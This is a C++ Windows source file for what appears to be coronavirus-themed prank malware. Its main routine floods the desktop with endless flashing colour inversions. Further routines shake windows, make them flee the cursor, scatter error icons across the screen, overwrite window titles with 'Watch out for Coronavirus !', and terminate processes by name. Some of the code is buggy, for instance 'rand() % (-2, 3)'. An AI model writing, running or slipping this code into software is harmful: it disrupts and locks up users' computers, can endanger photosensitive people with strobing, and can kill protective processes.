#include <windows.h>
#include <cstdio>
#include <math.h>  
#include <time.h>

#pragma warning(disable:4996)

int zikawindoweff1() {
	while (true) {
		RECT rect;
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect);
		MoveWindow(hwnd, rect.left + rand() % (-2, 3), rect.top + rand() % (-2, 3), rect.right - rect.left + rand() % (-2, 3), rect.bottom - rect.top + rand() % (-2, 3), false);
		SetWindowPos(hwnd, 0, rect.left + rand() % (-2, 3), rect.top + rand() % (-2, 3), rect.right - rect.left + rand() % (-2, 3), rect.bottom - rect.top + rand() % (-2, 3), SWP_ASYNCWINDOWPOS | SWP_NOACTIVATE | SWP_NOOWNERZORDER);
	}
}

HWND GetDesktopHandle() {
	HWND hShellWnd = GetShellWindow();
	HWND hDefView = FindWindowEx(hShellWnd, NULL, L"SHELLDLL_DefView", NULL);
	HWND folderView = FindWindowEx(hDefView, NULL, L"SysListView32", NULL);
	return folderView;
}

int WindowMagistr() {
	while (true) {
		RECT rect3;
		POINT c;
		GetCursorPos(&c);
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect3);
		int x3 = c.x;
		int y3 = c.y;
		int w1 = GetSystemMetrics(SM_CXSCREEN);
		int h1 = GetSystemMetrics(SM_CYSCREEN);
		if (x3 >= rect3.left && x3 < rect3.right && y3 >= rect3.top && y3 < rect3.bottom)
		{
			bool flag = false;
			GetWindowRect(hwnd, &rect3);
			if (rect3.left < 201)
			{
				MoveWindow(hwnd, 420, rect3.top, 200, 200, true);
				flag = true;
			}
			GetWindowRect(hwnd, &rect3);
			if (rect3.top < 201)
			{
				MoveWindow(hwnd, rect3.left, 420, 200, 200, true);
				flag = true;
			}
			GetWindowRect(hwnd, &rect3);
			if (rect3.right > w1 - 201)
			{
				MoveWindow(hwnd, w1 - 420, rect3.top, 200, 200, true);
				flag = true;
			}
			GetWindowRect(hwnd, &rect3);
			if (rect3.bottom > h1 - 201)
			{
				MoveWindow(hwnd, rect3.left, h1 - 420, 200, 200, true);
				flag = true;
			}
			if (!flag)
			{
				if (y3 < (rect3.top + rect3.bottom) / 2 && x3 < (rect3.left + rect3.right) / 2 && x3 < w1 - 200 && y3 < h1 - 200)
				{
					MoveWindow(hwnd, x3 + 31, y3 + 31, 200, 200, true);
				}
				else if (y3 < (rect3.top + rect3.bottom) / 2 && x3 > 200 && y3 < h1 - 200)
				{
					MoveWindow(hwnd, x3 - 201, y3 + 31, 200, 200, true);
				}
				else if (x3 < (rect3.left + rect3.right) / 2 && x3 < w1 - 200 && y3 > 200)
				{
					MoveWindow(hwnd, x3 + 31, y3 - 201, 200, 200, true);
				}
				else if (x3 > 200 && y3 > 200)
				{
					MoveWindow(hwnd, x3 - 201, y3 - 201, 200, 200, true);
				}
			}
		}
	}
}

int CooliconDraw() {
	double a2 = 0;
	while (true) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		DrawIcon(hdc, rect.left + (int)(sin(a2) * (double)w), rect.top + (int)a2, LoadIconW(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.left + (int)(sin(a2) * (double)w), rect.bottom - (int)a2, LoadIconW(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.right - (int)a2, rect.top + (int)(sin(a2) * (double)h), LoadIconW(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.left + (int)a2, rect.top + (int)(sin(a2) * (double)h), LoadIconW(NULL, IDI_ERROR));
		if (a2 > h)
			a2 = 0;
		a2 += 0.3;
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
wchar_t* generateRandomUnicodeString(size_t len, size_t start, size_t end);

wchar_t* generateRandomUnicodeString(size_t len, size_t start, size_t end) {
	wchar_t* ustr = new wchar_t[len + 1];
	size_t intervalLength = end - start + 1;
	srand(time(NULL));
	for (auto i = 0; i < len; i++) {
		ustr[i] = (rand() % intervalLength) + start;
	}
	ustr[len] = L'\0';
	return ustr;
}


BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"Watch out for Coronavirus !", SMTO_ABORTIFHUNG, 100, NULL);
	return 0;
}


int APIENTRY main(HINSTANCE Inst, HINSTANCE Prev, LPSTR Cmd, int showcmd) {	
	HDC hdc = GetWindowDC(GetDesktopWindow());
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left;
	int h = rect.bottom - rect.top;

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, NULL, NULL, w, h, PATINVERT);
	}
}

#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>

BOOL FindProcessByFileName(const char* filename) {
	bool Exists;
	HANDLE hss = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	BOOL hr = Process32First(hss, &pe);
	while (hr) {
		if (strcmp((const char*)pe.szExeFile, filename) == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pe.th32ProcessID);
			if (hProcess != NULL)
				Exists = true;
			else
				Exists = false;
		}
		hr = Process32Next(hss, &pe);
	}
	CloseHandle(hss);
	return Exists;
}

BOOL KillProcessByFileName(const char* filename) {
	HANDLE hss = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	BOOL hr = Process32First(hss, &pe);
	while (hr) {
		if (strcmp((const char*)pe.szExeFile, filename) == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pe.th32ProcessID);
			if (hProcess != NULL) {
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hr = Process32Next(hss, &pe);
	}
	CloseHandle(hss);
	return 0;
}

int IconWorm() {
	HDC hdc = GetWindowDC(GetDesktopWindow());
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left;
	int h = rect.bottom - rect.top;

	float x1 = 0;
	float y1 = 0;
	float y2 = 0;
	float eF = 40;

	while (true) {
		float yEx = rand() % h - 10;
		for (float x = 0; x < 60; x += 0.1F) {
			y2 = (float)sin(x);

			DrawIcon(hdc, x1 * eF, y1 * eF + yEx, LoadIconW(NULL, IDI_ASTERISK));
			x1 = x;
			y1 = y2;
			Sleep(10);
		}
	}
}

